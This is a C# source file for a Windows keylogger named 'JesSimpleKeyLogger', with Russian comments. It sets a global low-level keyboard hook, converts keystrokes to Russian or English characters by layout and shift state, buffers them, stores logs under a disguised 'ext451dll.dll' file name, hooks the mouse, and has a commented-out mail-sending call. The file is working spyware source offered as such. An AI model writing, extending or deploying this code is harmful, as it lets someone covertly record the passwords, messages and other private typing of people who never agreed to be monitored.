using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using system32;
using System.Timers;
using Microsoft.VisualBasic;

namespace JesSimpleKeyLogger
{
    public partial class Form1 : Form
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout([In] int idThread);
        [DllImport("user32.dll")]
        static extern short GetKeyState([In] int keys);

        /// <summary>
        /// Вернёт Id раскладки.
        /// </summary>
        public static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }

        public static int sht;
        public static string rass;
        public Form1()
        {
            InitializeComponent();
            //timer
            System.Timers.Timer tm = new System.Timers.Timer();
            tm.Interval = 3600000;
            tm.Enabled = true;
            tm.Elapsed += new ElapsedEventHandler(timer_Tick);
            tm.Start();
            if (Directory.Exists(@"d:\work\key\")) { } else { Directory.CreateDirectory(@"d:\work\key\"); }
            _hookID = SetHook(_proc);
            write.writestr();
            InterceptMouse.Main2();
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        private void timer_Tick(object sender, EventArgs e)
        {
            decrypt.decr();
        }
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private const string path = @"d:\work\key\ext451dll.dll"; // использовать const не обязательно
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            string r1 = "1033";
            string r2 = "1049";
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // rass = InputLanguage.CurrentInputLanguage.LayoutName;
                rass = Convert.ToString(GetKeyboardLayout());
                if (((Control.ModifierKeys & Keys.Shift) == Keys.Shift) || ((Control.ModifierKeys & Keys.CapsLock) == Keys.CapsLock)) sht = 7; else sht = 5;
                int vkCode = Marshal.ReadInt32(lParam);

                string keyString = "";
                // mail.SendMail();

                #region
                if (rass == r2)
                {
                    if (sht == 7)
                    {
                        if (vkCode == 65) { keyString = "Ф"; }
                        else if (vkCode == 66) { keyString = "И"; }
                        else if (vkCode == 67) { keyString = "С"; }
                        else if (vkCode == 68) { keyString = "В"; }
                        else if (vkCode == 69) { keyString = "У"; }
                        else if (vkCode == 70) { keyString = "А"; }
                        else if (vkCode == 71) { keyString = "П"; }
                        else if (vkCode == 72) { keyString = "Р"; }
                        else if (vkCode == 73) { keyString = "Ш"; }
                        else if (vkCode == 74) { keyString = "О"; }
                        else if (vkCode == 75) { keyString = "Л"; }
                        else if (vkCode == 76) { keyString = "Д"; }
                        else if (vkCode == 77) { keyString = "Ь"; }
                        else if (vkCode == 78) { keyString = "Т"; }
                        else if (vkCode == 79) { keyString = "Щ"; }
                        else if (vkCode == 80) { keyString = "З"; }
                        else if (vkCode == 81) { keyString = "Й"; }
                        else if (vkCode == 82) { keyString = "К"; }
                        else if (vkCode == 83) { keyString = "Ы"; }
                        else if (vkCode == 84) { keyString = "Е"; }
                        else if (vkCode == 85) { keyString = "Г"; }
                        else if (vkCode == 86) { keyString = "М"; }
                        else if (vkCode == 87) { keyString = "Ц"; }
                        else if (vkCode == 88) { keyString = "Ч"; }
                        else if (vkCode == 89) { keyString = "Н"; }
                        else if (vkCode == 90) { keyString = "Я"; }
                        else if (vkCode == 48) { keyString = ")"; }
                        else if (vkCode == 49) { keyString = "!"; }
                        else if (vkCode == 50) { keyString = "\""; }    //?
                        else if (vkCode == 51) { keyString = @"№"; }
                        else if (vkCode == 52) { keyString = ";"; }
                        else if (vkCode == 53) { keyString = "%"; }
                        else if (vkCode == 54) { keyString = ":"; }
                        else if (vkCode == 55) { keyString = "?"; }
                        else if (vkCode == 56) { keyString = "*"; }
                        else if (vkCode == 57) { keyString = "("; }
                        else if (vkCode == 192) { keyString = "Ё"; }
                        else if (vkCode == 189) { keyString = "_"; }
                        else if (vkCode == 187) { keyString = "+"; }
                        else if (vkCode == 219) { keyString = "Х"; }
                        else if (vkCode == 221) { keyString = "Ъ"; }
                        else if (vkCode == 186) { keyString = "Ж"; }
                        else if (vkCode == 222) { keyString = "Э"; }
                        else if (vkCode == 220) { keyString = @"/"; }
                        else if (vkCode == 188) { keyString = "Б"; }
                        else if (vkCode == 190) { keyString = "Ю"; }
                        else if (vkCode == 191) { keyString = ","; }
                        else if (vkCode == 32) { keyString = " "; }

                        //num
                        else if (vkCode == 96) { keyString = "0"; }
                        else if (vkCode == 97) { keyString = "1"; }
                        else if (vkCode == 98) { keyString = "2"; }
                        else if (vkCode == 99) { keyString = "3"; }
                        else if (vkCode == 100) { keyString = "4"; }
                        else if (vkCode == 101) { keyString = "5"; }
                        else if (vkCode == 102) { keyString = "6"; }
                        else if (vkCode == 103) { keyString = "7"; }
                        else if (vkCode == 104) { keyString = "8"; }
                        else if (vkCode == 105) { keyString = "9"; }
                        else if (vkCode == 106) { keyString = "*"; }
                        else if (vkCode == 107) { keyString = "+"; }
                        else if (vkCode == 108) { keyString = "-"; }
                        else if (vkCode == 109) { keyString = "."; }
                        else if (vkCode == 110) { keyString = "/"; }
                    }
                    else
                    {
                        if (vkCode == 65) { keyString = "ф"; }
                        else if (vkCode == 66) { keyString = "и"; }
                        else if (vkCode == 67) { keyString = "с"; }
                        else if (vkCode == 68) { keyString = "в"; }
                        else if (vkCode == 69) { keyString = "у"; }
                        else if (vkCode == 70) { keyString = "а"; }
                        else if (vkCode == 71) { keyString = "п"; }
                        else if (vkCode == 72) { keyString = "р"; }
                        else if (vkCode == 73) { keyString = "ш"; }
                        else if (vkCode == 74) { keyString = "о"; }
                        else if (vkCode == 75) { keyString = "л"; }
                        else if (vkCode == 76) { keyString = "д"; }
                        else if (vkCode == 77) { keyString = "ь"; }
                        else if (vkCode == 78) { keyString = "т"; }
                        else if (vkCode == 79) { keyString = "щ"; }
                        else if (vkCode == 80) { keyString = "з"; }
                        else if (vkCode == 81) { keyString = "й"; }
                        else if (vkCode == 82) { keyString = "к"; }
                        else if (vkCode == 83) { keyString = "ы"; }
                        else if (vkCode == 84) { keyString = "е"; }
                        else if (vkCode == 85) { keyString = "г"; }
                        else if (vkCode == 86) { keyString = "м"; }
                        else if (vkCode == 87) { keyString = "ц"; }
                        else if (vkCode == 88) { keyString = "ч"; }
                        else if (vkCode == 89) { keyString = "н"; }
                        else if (vkCode == 90) { keyString = "я"; }
                        else if (vkCode == 48) { keyString = "0"; }
                        else if (vkCode == 49) { keyString = "1"; }
                        else if (vkCode == 50) { keyString = "2"; }
                        else if (vkCode == 51) { keyString = "3"; }
                        else if (vkCode == 52) { keyString = "4"; }
                        else if (vkCode == 53) { keyString = "5"; }
                        else if (vkCode == 54) { keyString = "6"; }
                        else if (vkCode == 55) { keyString = "7"; }
                        else if (vkCode == 56) { keyString = "8"; }
                        else if (vkCode == 57) { keyString = "9"; }
                        else if (vkCode == 192) { keyString = "ё"; }
                        else if (vkCode == 189) { keyString = "-"; }
                        else if (vkCode == 187) { keyString = "="; }
                        else if (vkCode == 219) { keyString = "х"; }
                        else if (vkCode == 221) { keyString = "ъ"; }
                        else if (vkCode == 186) { keyString = "ж"; }
                        else if (vkCode == 222) { keyString = "э"; }
                        else if (vkCode == 220) { keyString = @"\"; }
                        else if (vkCode == 188) { keyString = "б"; }
                        else if (vkCode == 190) { keyString = "ю"; }
                        else if (vkCode == 191) { keyString = "."; }
                        else if (vkCode == 32) { keyString = " "; }
                        //num
                        else if (vkCode == 96) { keyString = "0"; }
                        else if (vkCode == 97) { keyString = "1"; }
                        else if (vkCode == 98) { keyString = "2"; }
                        else if (vkCode == 99) { keyString = "3"; }
                        else if (vkCode == 100) { keyString = "4"; }
                        else if (vkCode == 101) { keyString = "5"; }
                        else if (vkCode == 102) { keyString = "6"; }
                        else if (vkCode == 103) { keyString = "7"; }
                        else if (vkCode == 104) { keyString = "8"; }
                        else if (vkCode == 105) { keyString = "9"; }
                        else if (vkCode == 106) { keyString = "*"; }
                        else if (vkCode == 107) { keyString = "+"; }
                        else if (vkCode == 108) { keyString = "-"; }
                        else if (vkCode == 109) { keyString = "."; }
                        else if (vkCode == 110) { keyString = "/"; }
                        else { keyString = Convert.ToChar(vkCode).ToString(); }
                    }

                }
                else
                {
                    if (rass == r1)
                    {
                        if (sht == 7)
                        {
                            if (vkCode == 65) { keyString = "A"; }
                            else if (vkCode == 66) { keyString = "B"; }
                            else if (vkCode == 67) { keyString = "C"; }
                            else if (vkCode == 68) { keyString = "D"; }
                            else if (vkCode == 69) { keyString = "E"; }
                            else if (vkCode == 70) { keyString = "F"; }
                            else if (vkCode == 71) { keyString = "G"; }
                            else if (vkCode == 72) { keyString = "H"; }
                            else if (vkCode == 73) { keyString = "I"; }
                            else if (vkCode == 74) { keyString = "J"; }
                            else if (vkCode == 75) { keyString = "K"; }
                            else if (vkCode == 76) { keyString = "L"; }
                            else if (vkCode == 77) { keyString = "M"; }
                            else if (vkCode == 78) { keyString = "N"; }
                            else if (vkCode == 79) { keyString = "O"; }
                            else if (vkCode == 80) { keyString = "P"; }
                            else if (vkCode == 81) { keyString = "Q"; }
                            else if (vkCode == 82) { keyString = "R"; }
                            else if (vkCode == 83) { keyString = "S"; }
                            else if (vkCode == 84) { keyString = "T"; }
                            else if (vkCode == 85) { keyString = "U"; }
                            else if (vkCode == 86) { keyString = "V"; }
                            else if (vkCode == 87) { keyString = "W"; }
                            else if (vkCode == 88) { keyString = "X"; }
                            else if (vkCode == 89) { keyString = "Y"; }
                            else if (vkCode == 90) { keyString = "Z"; }
                            else if (vkCode == 48) { keyString = ")"; }
                            else if (vkCode == 49) { keyString = "!"; }
                            else if (vkCode == 50) { keyString = @"@"; }    //?
                            else if (vkCode == 51) { keyString = @"#"; }
                            else if (vkCode == 52) { keyString = "$"; }
                            else if (vkCode == 53) { keyString = "%"; }
                            else if (vkCode == 54) { keyString = "^"; }
                            else if (vkCode == 55) { keyString = "&"; }
                            else if (vkCode == 56) { keyString = "*"; }
                            else if (vkCode == 57) { keyString = "("; }
                            else if (vkCode == 192) { keyString = "~"; }
                            else if (vkCode == 189) { keyString = "_"; }
                            else if (vkCode == 187) { keyString = "+"; }
                            else if (vkCode == 219) { keyString = "{"; }
                            else if (vkCode == 221) { keyString = "}"; }
                            else if (vkCode == 186) { keyString = ":"; }
                            else if (vkCode == 222) { keyString = "\""; }//?
                            else if (vkCode == 220) { keyString = @"|"; }
                            else if (vkCode == 188) { keyString = "<"; }
                            else if (vkCode == 190) { keyString = ">"; }
                            else if (vkCode == 191) { keyString = "?"; }

                            else if (vkCode == 32) { keyString = " "; }

                            //num
                            else if (vkCode == 96) { keyString = "0"; }
                            else if (vkCode == 97) { keyString = "1"; }
                            else if (vkCode == 98) { keyString = "2"; }
                            else if (vkCode == 99) { keyString = "3"; }
                            else if (vkCode == 100) { keyString = "4"; }
                            else if (vkCode == 101) { keyString = "5"; }
                            else if (vkCode == 102) { keyString = "6"; }
                            else if (vkCode == 103) { keyString = "7"; }
                            else if (vkCode == 104) { keyString = "8"; }
                            else if (vkCode == 105) { keyString = "9"; }
                            else if (vkCode == 106) { keyString = "*"; }
                            else if (vkCode == 107) { keyString = "+"; }
                            else if (vkCode == 108) { keyString = "-"; }
                            else if (vkCode == 109) { keyString = "."; }
                            else if (vkCode == 110) { keyString = "/"; }
                        }
                        else
                        {
                            if (vkCode == 65) { keyString = "a"; }
                            else if (vkCode == 66) { keyString = "b"; }
                            else if (vkCode == 67) { keyString = "c"; }
                            else if (vkCode == 68) { keyString = "d"; }
                            else if (vkCode == 69) { keyString = "e"; }
                            else if (vkCode == 70) { keyString = "f"; }
                            else if (vkCode == 71) { keyString = "g"; }
                            else if (vkCode == 72) { keyString = "h"; }
                            else if (vkCode == 73) { keyString = "i"; }
                            else if (vkCode == 74) { keyString = "j"; }
                            else if (vkCode == 75) { keyString = "k"; }
                            else if (vkCode == 76) { keyString = "l"; }
                            else if (vkCode == 77) { keyString = "m"; }
                            else if (vkCode == 78) { keyString = "n"; }
                            else if (vkCode == 79) { keyString = "o"; }
                            else if (vkCode == 80) { keyString = "p"; }
                            else if (vkCode == 81) { keyString = "q"; }
                            else if (vkCode == 82) { keyString = "r"; }
                            else if (vkCode == 83) { keyString = "s"; }
                            else if (vkCode == 84) { keyString = "t"; }
                            else if (vkCode == 85) { keyString = "u"; }
                            else if (vkCode == 86) { keyString = "v"; }
                            else if (vkCode == 87) { keyString = "w"; }
                            else if (vkCode == 88) { keyString = "x"; }
                            else if (vkCode == 89) { keyString = "y"; }
                            else if (vkCode == 90) { keyString = "z"; }
                            else if (vkCode == 48) { keyString = "0"; }
                            else if (vkCode == 49) { keyString = "1"; }
                            else if (vkCode == 50) { keyString = "2"; }
                            else if (vkCode == 51) { keyString = "3"; }
                            else if (vkCode == 52) { keyString = "4"; }
                            else if (vkCode == 53) { keyString = "5"; }
                            else if (vkCode == 54) { keyString = "6"; }
                            else if (vkCode == 55) { keyString = "7"; }
                            else if (vkCode == 56) { keyString = "8"; }
                            else if (vkCode == 57) { keyString = "9"; }
                            else if (vkCode == 192) { keyString = "`"; }
                            else if (vkCode == 189) { keyString = "-"; }
                            else if (vkCode == 187) { keyString = "="; }
                            else if (vkCode == 219) { keyString = "["; }
                            else if (vkCode == 221) { keyString = "]"; }
                            else if (vkCode == 186) { keyString = ";"; }
                            else if (vkCode == 222) { keyString = "'"; }
                            else if (vkCode == 220) { keyString = @"\"; }
                            else if (vkCode == 188) { keyString = ","; }
                            else if (vkCode == 190) { keyString = "."; }
                            else if (vkCode == 191) { keyString = "/"; }

                            else if (vkCode == 32) { keyString = " "; }

                            //num
                            else if (vkCode == 96) { keyString = "0"; }
                            else if (vkCode == 97) { keyString = "1"; }
                            else if (vkCode == 98) { keyString = "2"; }
                            else if (vkCode == 99) { keyString = "3"; }
                            else if (vkCode == 100) { keyString = "4"; }
                            else if (vkCode == 101) { keyString = "5"; }
                            else if (vkCode == 102) { keyString = "6"; }
                            else if (vkCode == 103) { keyString = "7"; }
                            else if (vkCode == 104) { keyString = "8"; }
                            else if (vkCode == 105) { keyString = "9"; }
                            else if (vkCode == 106) { keyString = "*"; }
                            else if (vkCode == 107) { keyString = "+"; }
                            else if (vkCode == 108) { keyString = "-"; }
                            else if (vkCode == 109) { keyString = "."; }
                            else if (vkCode == 110) { keyString = "/"; }
                            else { keyString = Convert.ToChar(vkCode).ToString(); }
                        }
                    }
                    else { keyString = Convert.ToChar(vkCode).ToString(); }
                }
                #endregion

                write.buf = write.buf + keyString;

                if ((vkCode != 16) && (vkCode != 17) && (vkCode != 18))
                {

                }
                // }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }



        private void Form1_Load_1(object sender, EventArgs e)
        {

        }



    }

}
